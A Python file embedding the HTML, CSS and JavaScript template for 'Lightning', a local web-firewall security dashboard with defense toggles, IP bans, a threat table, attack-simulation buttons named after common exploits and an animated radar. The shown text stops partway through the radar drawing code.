"""
=============================================================================
                  LIGHTNING - CRAZY FUTURISTIC WEB SOC & COMMAND CENTER
                  CREATED BY NEXO-TECH BY ALEXANDER
=============================================================================
"""

import sys
import os
import time
import json
import socket
import platform
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from typing import Optional, Dict, Any

from core.dashboard_auth import (
    verify_login, verify_session, extract_session_token, get_login_page_html
)

SOC_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ LIGHTNING | Autonomous Cyber Defense Command Center</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Outfit:wght@300;400;600;700;800;900&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #030712;
            --bg-card: rgba(15, 23, 42, 0.75);
            --bg-card-hover: rgba(30, 41, 59, 0.85);
            --bg-darker: rgba(3, 7, 18, 0.85);
            --border-glow: rgba(0, 243, 255, 0.35);
            --border-card: rgba(51, 65, 85, 0.5);
            --cyan: #00f3ff;
            --cyan-glow: rgba(0, 243, 255, 0.4);
            --green: #00ff9d;
            --green-glow: rgba(0, 255, 157, 0.4);
            --red: #ff0055;
            --red-glow: rgba(255, 0, 85, 0.4);
            --yellow: #ffb700;
            --yellow-glow: rgba(255, 183, 0, 0.4);
            --purple: #b026ff;
            --purple-glow: rgba(176, 38, 255, 0.4);
            --blue: #3b82f6;
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --text-cyber: #38bdf8;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 10%, rgba(0, 243, 255, 0.12) 0%, transparent 45%),
                radial-gradient(circle at 90% 90%, rgba(176, 38, 255, 0.12) 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, rgba(255, 0, 85, 0.05) 0%, transparent 60%),
                linear-gradient(to right, rgba(0, 243, 255, 0.03) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
            background-size: 100% 100%, 100% 100%, 100% 100%, 40px 40px, 40px 40px;
            padding: 24px;
        }

        /* Scanline HUD effect */
        body::after {
            content: " ";
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            background-size: 100% 3px, 4px 100%;
            pointer-events: none;
            z-index: 9999;
            opacity: 0.6;
        }

        /* Glassmorphism Cards with Neon Accents */
        .glass {
            background: var(--bg-card);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid var(--border-card);
            border-radius: 16px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .glass:hover {
            border-color: var(--border-glow);
            box-shadow: 0 12px 35px -10px var(--cyan-glow);
        }

        /* Cyberpunk Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 18px 26px;
            margin-bottom: 22px;
            border-radius: 18px;
            border: 1px solid rgba(0, 243, 255, 0.3);
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.9) 0%, rgba(6, 11, 25, 0.95) 100%);
        }
        .brand-box {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .brand-icon {
            font-size: 2.2rem;
            animation: pulse-glow 2s infinite ease-in-out;
            filter: drop-shadow(0 0 10px var(--cyan));
        }
        .brand-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.8rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00f3ff 0%, #00ff9d 50%, #b026ff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
            text-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
        }
        .author-badge {
            background: rgba(176, 38, 255, 0.15);
            border: 1px solid rgba(176, 38, 255, 0.5);
            color: #d8b4fe;
            padding: 3px 10px;
            border-radius: 14px;
            font-size: 0.7rem;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            display: inline-block;
            margin-top: 4px;
        }
        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        
        .btn-cyber {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 0.82rem;
            letter-spacing: 1px;
            padding: 9px 18px;
            border-radius: 10px;
            border: 1px solid transparent;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.25s ease;
            text-transform: uppercase;
        }
        .btn-fire {
            background: linear-gradient(135deg, #ff0055 0%, #d90429 100%);
            color: #fff;
            box-shadow: 0 0 15px var(--red-glow);
            border-color: rgba(255, 0, 85, 0.5);
        }
        .btn-fire:hover {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 0 25px rgba(255, 0, 85, 0.8);
        }
        .btn-sync {
            background: linear-gradient(135deg, #00f3ff 0%, #0284c7 100%);
            color: #030712;
            font-weight: 900;
            box-shadow: 0 0 15px var(--cyan-glow);
        }
        .btn-sync:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(0, 243, 255, 0.8);
        }
        .btn-radar {
            background: linear-gradient(135deg, #b026ff 0%, #7928ca 100%);
            color: #fff;
            box-shadow: 0 0 15px var(--purple-glow);
        }
        .btn-radar:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(176, 38, 255, 0.8);
        }
        .btn-audio {
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(0, 243, 255, 0.4);
            color: var(--cyan);
            padding: 8px 12px;
        }

        .live-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 255, 157, 0.12);
            border: 1px solid rgba(0, 255, 157, 0.4);
            color: #00ff9d;
            padding: 7px 16px;
            border-radius: 20px;
            font-size: 0.78rem;
            font-weight: 800;
            letter-spacing: 1px;
            font-family: 'Orbitron', sans-serif;
        }
        .pulse-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff9d;
            box-shadow: 0 0 12px #00ff9d;
            animation: pulse-ring 1.5s infinite;
        }

        /* Local Host & Process Commander Panel */
        .host-commander-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 16px;
            margin-bottom: 22px;
        }
        .host-card {
            padding: 18px 22px;
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.85) 0%, rgba(10, 15, 30, 0.9) 100%);
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 14px;
            position: relative;
        }
        .host-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--cyan), transparent);
        }
        .host-label {
            font-size: 0.72rem;
            font-family: 'Orbitron', sans-serif;
            color: var(--text-dim);
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .host-value {
            font-family: 'Fira Code', monospace;
            font-size: 1.15rem;
            font-weight: 700;
            color: #fff;
            word-break: break-all;
        }
        .host-sub {
            font-size: 0.75rem;
            color: var(--cyan);
            margin-top: 4px;
            font-family: 'Fira Code', monospace;
        }

        /* Defense Matrix Toggle Grid */
        .controls-panel {
            padding: 22px 26px;
            margin-bottom: 22px;
            border: 1px solid rgba(176, 38, 255, 0.3);
        }
        .controls-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.05rem;
            font-weight: 900;
            color: #d8b4fe;
            letter-spacing: 1.5px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
        .toggles-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
            gap: 12px;
            margin-bottom: 16px;
        }
        .toggle-btn {
            background: rgba(15, 23, 42, 0.9);
            border: 1px solid rgba(51, 65, 85, 0.6);
            border-radius: 10px;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: all 0.2s;
        }
        .toggle-btn.active {
            border-color: var(--green);
            background: rgba(0, 255, 157, 0.08);
            box-shadow: 0 0 12px rgba(0, 255, 157, 0.15);
        }
        .toggle-btn.inactive {
            border-color: var(--red);
            background: rgba(255, 0, 85, 0.08);
            opacity: 0.7;
        }
        .toggle-name {
            font-size: 0.8rem;
            font-weight: 700;
            color: var(--text-main);
        }
        .toggle-status {
            font-family: 'Fira Code', monospace;
            font-size: 0.7rem;
            font-weight: 800;
            padding: 2px 6px;
            border-radius: 6px;
        }
        .status-on { background: rgba(0, 255, 157, 0.2); color: var(--green); }
        .status-off { background: rgba(255, 0, 85, 0.2); color: var(--red); }

        /* Quick Attack Payload Launch Bar */
        .attack-launcher-box {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            padding: 12px 16px;
            background: rgba(3, 7, 18, 0.6);
            border-radius: 10px;
            border: 1px solid rgba(255, 0, 85, 0.3);
        }
        .attack-btn-pill {
            background: rgba(255, 0, 85, 0.15);
            border: 1px solid rgba(255, 0, 85, 0.4);
            color: #fecdd3;
            font-size: 0.75rem;
            font-weight: 700;
            padding: 6px 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Fira Code', monospace;
        }
        .attack-btn-pill:hover {
            background: #ff0055;
            color: #fff;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.7);
            transform: scale(1.05);
        }

        /* Metrics Grid */
        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
            gap: 16px;
            margin-bottom: 22px;
        }
        .metric-card {
            padding: 20px;
            position: relative;
            overflow: hidden;
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(8, 14, 28, 0.9) 100%);
        }
        .metric-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 4px; height: 100%;
        }
        .card-cyan::before { background: var(--cyan); }
        .card-red::before { background: var(--red); }
        .card-green::before { background: var(--green); }
        .card-purple::before { background: var(--purple); }
        .card-yellow::before { background: var(--yellow); }

        .metric-title {
            color: var(--text-dim);
            font-size: 0.75rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Orbitron', sans-serif;
            margin-bottom: 6px;
        }
        .metric-number {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.2rem;
            font-weight: 900;
            letter-spacing: 1px;
            color: #fff;
        }
        .metric-sub {
            font-size: 0.75rem;
            color: var(--cyan);
            margin-top: 4px;
            font-family: 'Fira Code', monospace;
        }

        /* Main Split Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 2.1fr 1fr;
            gap: 22px;
            margin-bottom: 22px;
        }
        @media(max-width: 1200px) { .main-grid { grid-template-columns: 1fr; } }

        .panel-box {
            padding: 22px 26px;
        }
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
        .panel-header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.05rem;
            font-weight: 800;
            letter-spacing: 1.2px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* Threat Feed Table */
        .threat-table-wrapper {
            overflow-x: auto;
            max-height: 420px;
            overflow-y: auto;
        }
        .threat-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
        }
        .threat-table th {
            position: sticky;
            top: 0;
            background: #0b1329;
            text-align: left;
            padding: 10px 12px;
            color: var(--text-dim);
            font-size: 0.72rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-family: 'Orbitron', sans-serif;
            border-bottom: 1px solid var(--border-card);
            z-index: 10;
        }
        .threat-table td {
            padding: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            font-family: 'Outfit', sans-serif;
        }
        .threat-table tr:hover {
            background: rgba(0, 243, 255, 0.04);
        }
        .ip-code {
            font-family: 'Fira Code', monospace;
            color: var(--yellow);
            font-weight: 700;
        }
        .uri-code {
            font-family: 'Fira Code', monospace;
            color: var(--cyan);
            max-width: 220px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 0.72rem;
            font-weight: 700;
            letter-spacing: 0.5px;
            font-family: 'Fira Code', monospace;
        }
        .badge-crit { background: rgba(255, 0, 85, 0.2); color: #fda4af; border: 1px solid rgba(255, 0, 85, 0.5); }
        .badge-high { background: rgba(255, 183, 0, 0.2); color: #fde68a; border: 1px solid rgba(255, 183, 0, 0.5); }
        .badge-block { background: rgba(0, 255, 157, 0.2); color: #6ee7b7; border: 1px solid rgba(0, 255, 157, 0.5); }

        /* HTML5 Canvas Radar Section */
        .radar-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
        }
        #radarCanvas {
            border-radius: 50%;
            background: radial-gradient(circle, rgba(0, 243, 255, 0.05) 0%, rgba(3, 7, 18, 0.95) 70%);
            border: 2px solid rgba(0, 243, 255, 0.4);
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.2), inset 0 0 20px rgba(0, 243, 255, 0.1);
        }

        /* Target Switcher & Quick Ban Controls */
        .quick-actions-bar {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 22px;
        }
        @media(max-width: 900px) { .quick-actions-bar { grid-template-columns: 1fr; } }

        .input-group {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }
        .cyber-input {
            flex: 1;
            background: rgba(3, 7, 18, 0.8);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 8px;
            padding: 9px 14px;
            color: #fff;
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            outline: none;
        }
        .cyber-input:focus {
            border-color: var(--cyan);
            box-shadow: 0 0 10px var(--cyan-glow);
        }

        /* Terminal Console Feed */
        .terminal-panel {
            background: #020617;
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 14px;
            padding: 16px;
            font-family: 'Fira Code', monospace;
            font-size: 0.8rem;
            height: 180px;
            overflow-y: auto;
            color: #a7f3d0;
            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.8);
            margin-bottom: 22px;
        }
        .terminal-line {
            line-height: 1.5;
            margin-bottom: 3px;
        }

        /* Active Quarantine Table */
        .quarantine-box {
            padding: 22px 26px;
        }
        .unban-btn {
            background: rgba(255, 0, 85, 0.15);
            border: 1px solid rgba(255, 0, 85, 0.4);
            color: #fda4af;
            padding: 5px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.75rem;
            font-weight: 700;
            transition: all 0.2s;
            font-family: 'Orbitron', sans-serif;
        }
        .unban-btn:hover {
            background: #ff0055;
            color: #fff;
            box-shadow: 0 0 10px rgba(255, 0, 85, 0.8);
        }

        /* Keyframes */
        @keyframes pulse-ring {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.7); }
            70% { transform: scale(1.1); box-shadow: 0 0 0 8px rgba(0, 255, 157, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 157, 0); }
        }
        @keyframes pulse-glow {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 8px var(--cyan)); }
            50% { transform: scale(1.08); filter: drop-shadow(0 0 18px var(--purple)); }
        }
    </style>
</head>
<body>

    <!-- Cyberpunk Header -->
    <div class="glass header">
        <div class="brand-box">
            <div class="brand-icon">⚡</div>
            <div>
                <div class="brand-title">LIGHTNING COMMAND CENTER</div>
                <div class="author-badge">CREATED BY NEXO-TECH BY ALEXANDER • AUTONOMOUS WEB SOC</div>
            </div>
        </div>
        <div class="header-actions">
            <button class="btn-cyber btn-audio" id="audioToggleBtn" onclick="toggleAudio()">
                <span id="audioIcon">🔊</span> <span id="audioText">SFX ON</span>
            </button>
            <button class="btn-cyber btn-radar" onclick="triggerRadarSweep()">
                <span>👑</span> Radar Sweep
            </button>
            <button class="btn-cyber btn-sync" onclick="syncThreatFeeds()">
                <span>🌍</span> Sync Threat Feeds
            </button>
            <button class="btn-cyber btn-fire" onclick="simulateAttack('random')">
                <span>🚀</span> Fire Test Threat
            </button>
            <div class="live-indicator">
                <div class="pulse-dot"></div>
                <span id="socStatusText">LIVE SENTINEL ONLINE</span>
            </div>
        </div>
    </div>

    <!-- Local Host & Real-Time Process Information -->
    <div class="host-commander-grid">
        <div class="host-card">
            <div class="host-label">
                <span>Local Host System</span>
                <span style="color:var(--green);">● ACTIVE</span>
            </div>
            <div class="host-value" id="host-name">127.0.0.1 (Localhost)</div>
            <div class="host-sub" id="host-os">Python Runtime • Windows / Linux</div>
        </div>
        <div class="host-card">
            <div class="host-label">
                <span>WAF Shield Gateway</span>
                <span style="color:var(--cyan);">PROXY GATE</span>
            </div>
            <div class="host-value" id="host-waf-url" style="color:var(--cyan);">http://127.0.0.1:8080</div>
            <div class="host-sub">Reverse Proxy Active • Deep Inspection</div>
        </div>
        <div class="host-card">
            <div class="host-label">
                <span>Target Backend URL</span>
                <span style="color:var(--yellow);">PROTECTED HOST</span>
            </div>
            <div class="host-value" id="host-target-url" style="color:var(--yellow);">http://127.0.0.1:3000</div>
            <div class="host-sub" id="host-integrity">SHA-256 DOM Integrity: INTACT (100%)</div>
        </div>
        <div class="host-card">
            <div class="host-label">
                <span>Process Telemetry</span>
                <span style="color:var(--purple);">CORE RUNNER</span>
            </div>
            <div class="host-value" id="host-threads" style="color:#d8b4fe;">Threads: 6 • Engine PID</div>
            <div class="host-sub" id="host-uptime-sub">System Uptime: 00:00:00</div>
        </div>
    </div>

    <!-- Process & Defense Layer Controls Matrix -->
    <div class="glass controls-panel">
        <div class="controls-title">
            <span>🛡️ MASTER PROCESS & DEFENSE LAYER CONTROL MATRIX</span>
            <button class="btn-cyber" style="background:rgba(255,0,85,0.15); color:#fda4af; border:1px solid rgba(255,0,85,0.4); padding:4px 10px; font-size:0.7rem;" onclick="clearAllLogs()">
                🧹 Clear Log Stream
            </button>
        </div>

        <div class="toggles-grid">
            <div class="toggle-btn active" id="toggle-waf" onclick="toggleLayer('waf')">
                <span class="toggle-name">WAF Reverse Proxy</span>
                <span class="toggle-status status-on" id="status-waf">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-virtual_patch" onclick="toggleLayer('virtual_patch')">
                <span class="toggle-name">Zero-Day Patching</span>
                <span class="toggle-status status-on" id="status-virtual_patch">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-anti_bot" onclick="toggleLayer('anti_bot')">
                <span class="toggle-name">Anti-Bot PoW / CAPTCHA</span>
                <span class="toggle-status status-on" id="status-anti_bot">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-dlp" onclick="toggleLayer('dlp')">
                <span class="toggle-name">Outbound DLP Engine</span>
                <span class="toggle-status status-on" id="status-dlp">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-honeypot" onclick="toggleLayer('honeypot')">
                <span class="toggle-name">Honeypot Decoy Traps</span>
                <span class="toggle-status status-on" id="status-honeypot">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-geo" onclick="toggleLayer('geo')">
                <span class="toggle-name">Geo & Tor Interceptor</span>
                <span class="toggle-status status-on" id="status-geo">ON</span>
            </div>
            <div class="toggle-btn active" id="toggle-heuristic" onclick="toggleLayer('heuristic')">
                <span class="toggle-name">Heuristic Scorer</span>
                <span class="toggle-status status-on" id="status-heuristic">ON</span>
            </div>
        </div>

        <!-- Quick Attack Launch Buttons -->
        <div class="attack-launcher-box">
            <span style="font-family:'Orbitron',sans-serif; font-size:0.75rem; color:#f43f5e; font-weight:800; text-transform:uppercase;">
                💥 Simulate Exploit Attack:
            </span>
            <button class="attack-btn-pill" onclick="simulateAttack('log4shell')">Log4Shell (CVE-2021-44228)</button>
            <button class="attack-btn-pill" onclick="simulateAttack('spring4shell')">Spring4Shell</button>
            <button class="attack-btn-pill" onclick="simulateAttack('sqli')">SQL Injection</button>
            <button class="attack-btn-pill" onclick="simulateAttack('xss')">Cross-Site Scripting</button>
            <button class="attack-btn-pill" onclick="simulateAttack('rce')">Command Injection (RCE)</button>
            <button class="attack-btn-pill" onclick="simulateAttack('webshell')">Web Shell Upload</button>
            <button class="attack-btn-pill" onclick="simulateAttack('honeypot')">Honeypot Probe</button>
            <button class="attack-btn-pill" onclick="simulateAttack('lfi')">Path Traversal (LFI)</button>
        </div>
    </div>

    <!-- Quick Target Switcher & Manual Quarantine Bar -->
    <div class="quick-actions-bar">
        <div class="glass" style="padding:16px 20px;">
            <div style="font-family:'Orbitron',sans-serif; font-size:0.8rem; color:var(--cyan); font-weight:800;">
                🎯 HOT-SWITCH TARGET BACKEND URL
            </div>
            <div class="input-group">
                <input type="text" id="newTargetInput" class="cyber-input" placeholder="http://127.0.0.1:3000" />
                <button class="btn-cyber btn-sync" onclick="changeTargetUrl()">Update Target</button>
            </div>
        </div>
        <div class="glass" style="padding:16px 20px;">
            <div style="font-family:'Orbitron',sans-serif; font-size:0.8rem; color:var(--red); font-weight:800;">
                🚫 MANUAL ZERO-TOLERANCE IP BAN
            </div>
            <div class="input-group">
                <input type="text" id="manualBanIpInput" class="cyber-input" placeholder="Attacker IP (e.g. 192.168.1.50)" />
                <button class="btn-cyber btn-fire" onclick="manualBanIP()">Instant Ban</button>
            </div>
        </div>
    </div>

    <!-- Key Metrics Grid -->
    <div class="metrics-grid">
        <div class="glass metric-card card-cyan">
            <div class="metric-title">Engine Uptime</div>
            <div class="metric-number" id="metric-uptime">00:00:00</div>
            <div class="metric-sub">Continuous Active Protection</div>
        </div>
        <div class="glass metric-card card-green">
            <div class="metric-title">HTTP Requests Processed</div>
            <div class="metric-number" id="metric-total">0</div>
            <div class="metric-sub">Live Deep Packet Inspection</div>
        </div>
        <div class="glass metric-card card-red">
            <div class="metric-title">Exploits Intercepted</div>
            <div class="metric-number" id="metric-blocked" style="color:var(--red);">0</div>
            <div class="metric-sub" id="metric-block-rate">0% Interception Ratio</div>
        </div>
        <div class="glass metric-card card-purple">
            <div class="metric-title">Quarantine Blacklist</div>
            <div class="metric-number" id="metric-quarantine" style="color:#d8b4fe;">0</div>
            <div class="metric-sub">Zero-Tolerance Auto-Banned IPs</div>
        </div>
        <div class="glass metric-card card-yellow">
            <div class="metric-title">DLP Leaks Redacted</div>
            <div class="metric-number" id="metric-dlp" style="color:var(--yellow);">0</div>
            <div class="metric-sub">Secrets & Tokens Protected</div>
        </div>
    </div>

    <!-- Main Grid: Threat Stream + Visual Radar -->
    <div class="main-grid">
        
        <!-- Live Interception Stream Table -->
        <div class="glass panel-box">
            <div class="panel-header">
                <h2><span>⚡</span> Real-Time Threat Incident Stream</h2>
                <div style="font-size:0.75rem; color:var(--cyan); font-family:'Fira Code',monospace;">● STREAMING LIVE</div>
            </div>
            <div class="threat-table-wrapper">
                <table class="threat-table">
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Attacker IP</th>
                            <th>Target Payload</th>
                            <th>Threat Vector</th>
                            <th>Action Taken</th>
                        </tr>
                    </thead>
                    <tbody id="threat-tbody">
                        <tr>
                            <td colspan="5" style="color:var(--text-dim); text-align:center; padding:35px; font-family:'Fira Code',monospace;">
                                [⚡] Monitoring live HTTP traffic for incoming exploits & zero-days...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Radar & Security Health Column -->
        <div>
            <!-- Visual HTML5 360-Degree Radar -->
            <div class="glass panel-box radar-box" style="margin-bottom:22px;">
                <div class="panel-header" style="width:100%;">
                    <h2><span>👑</span> 360° Threat Radar</h2>
                    <span style="font-size:0.7rem; color:#d8b4fe; font-family:'Orbitron',sans-serif;">ACTIVE SWEEP</span>
                </div>
                <canvas id="radarCanvas" width="220" height="220"></canvas>
                <div style="font-size:0.75rem; color:var(--cyan); margin-top:10px; font-family:'Fira Code',monospace;" id="radarStatusText">
                    Radar Status: Sweeping Local Network Matrix
                </div>
            </div>

            <!-- Attack Distribution Breakdown -->
            <div class="glass panel-box">
                <div class="panel-header">
                    <h2><span>📊</span> Attack Vectors Caught</h2>
                </div>
                <div id="categories-container">
                    <div style="color:var(--text-dim); text-align:center; padding:20px; font-family:'Fira Code',monospace;">
                        No threat signatures caught yet.
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Live Cyber Console Terminal -->
    <div class="glass panel-box" style="margin-bottom:22px;">
        <div class="panel-header">
            <h2><span>📜</span> Live Cyber Console Terminal Log</h2>
            <div style="font-size:0.75rem; color:var(--green); font-family:'Fira Code',monospace;">TAILING LIGHTNING LOG</div>
        </div>
        <div class="terminal-panel" id="terminalLog">
            <div class="terminal-line" style="color:#38bdf8;">[+] LIGHTNING Master Autonomous Cyber Defense Engine Online.</div>
            <div class="terminal-line" style="color:#a7f3d0;">[+] Reverse Proxy Shield listening on http://127.0.0.1:8080</div>
            <div class="terminal-line" style="color:#d8b4fe;">[+] Web SOC Dashboard active on http://127.0.0.1:8888</div>
            <div class="terminal-line" style="color:#fbbf24;">[+] Ready to intercept incoming attacks and protect local host.</div>
        </div>
    </div>

    <!-- Active IP Quarantine Management Table -->
    <div class="glass quarantine-box">
        <div class="panel-header">
            <h2><span>⛔</span> Active Quarantined & Banned Attacker IPs</h2>
            <button class="btn-cyber" style="background:rgba(0,255,157,0.15); color:#6ee7b7; border:1px solid rgba(0,255,157,0.4); padding:5px 12px; font-size:0.75rem;" onclick="unbanAllIPs()">
                Unban All IPs
            </button>
        </div>
        <div class="threat-table-wrapper">
            <table class="threat-table">
                <thead>
                    <tr>
                        <th>Quarantined IP</th>
                        <th>Ban Reason</th>
                        <th>Remaining Ban Time</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="quarantine-tbody">
                    <tr><td colspan="4" style="color:var(--text-dim); text-align:center; padding:20px; font-family:'Fira Code',monospace;">No IPs currently in quarantine.</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        // Web Audio Synthesizer for Cyber Sound Effects
        let audioCtx = null;
        let sfxEnabled = true;

        function initAudio() {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
        }

        function playSound(type) {
            if (!sfxEnabled) return;
            try {
                initAudio();
                const now = audioCtx.currentTime;
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);

                if (type === 'alarm') {
                    osc.type = 'sawtooth';
                    osc.frequency.setValueAtTime(800, now);
                    osc.frequency.exponentialRampToValueAtTime(300, now + 0.25);
                    gain.gain.setValueAtTime(0.2, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
                    osc.start(now);
                    osc.stop(now + 0.25);
                } else if (type === 'beep') {
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(1200, now);
                    gain.gain.setValueAtTime(0.1, now);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.1);
                    osc.start(now);
                    osc.stop(now + 0.1);
                } else if (type === 'radar') {
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(500, now);
                    gain.gain.setValueAtTime(0.08, now);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
                    osc.start(now);
                    osc.stop(now + 0.3);
                }
            } catch(e) {}
        }

        function toggleAudio() {
            sfxEnabled = !sfxEnabled;
            document.getElementById('audioText').innerText = sfxEnabled ? 'SFX ON' : 'SFX OFF';
            document.getElementById('audioIcon').innerText = sfxEnabled ? '🔊' : '🔇';
            if (sfxEnabled) playSound('beep');
        }

        // HTML5 Radar Canvas Animation
        const radarCanvas = document.getElementById('radarCanvas');
        const radarCtx = radarCanvas.getContext('2d');
        let radarAngle = 0;
        let radarBlips = [];

        function drawRadar() {
            const w = radarCanvas.width;
            const h = radarCanvas.height;
            const cx = w / 2;
            const cy = h / 2;
            const r = w / 2 - 10;

            radarCtx.clearRect(0, 0, w, h);

            // Concentric rings
            radarCtx.strokeStyle = 'rgba(0, 243, 255, 0.25)';
            radarCtx.lineWidth = 1;
            for (let i = 1; i <= 3; i++) {
                radarCtx.beginPath();
                radarCtx.arc(cx, cy, (r / 3) * i, 0, Math.PI * 2);
                radarCtx.stroke();
            }

            // Crosshairs
            radarCtx.beginPath();
            radarCtx.moveTo(cx - r, cy);
            radarCtx.lineTo(cx + r, cy);
            radarCtx.moveTo(cx, cy - r);
            radarCtx.lineTo(cx, cy + r);
            radarCtx.stroke();

            // Sweep Line & Gradient
            radarCtx.save();
            radarCtx.translate(cx, cy);
            radarCtx.rotate(radarAngle);

            const sweepGrad = radarCtx.createRadialGradient(0, 0, 0, 0, 0, r);
            sweepGrad.addColorStop(0, 'rgba(0, 243, 255, 0.5)');
            sweepGrad.addColorStop(1, 'rgba(0, 243, 255, 0)');

            radarCtx.beginPath();
            radarCtx.moveTo(0, 0);
            radarCtx.arc(0, 0, r, -0.4, 0);
            radarCtx.closePath();
            radarCtx.fillStyle = 'rgba(0, 243, 255, 0.15)';
            radarCtx.fill();

            radarCtx.beginPath();
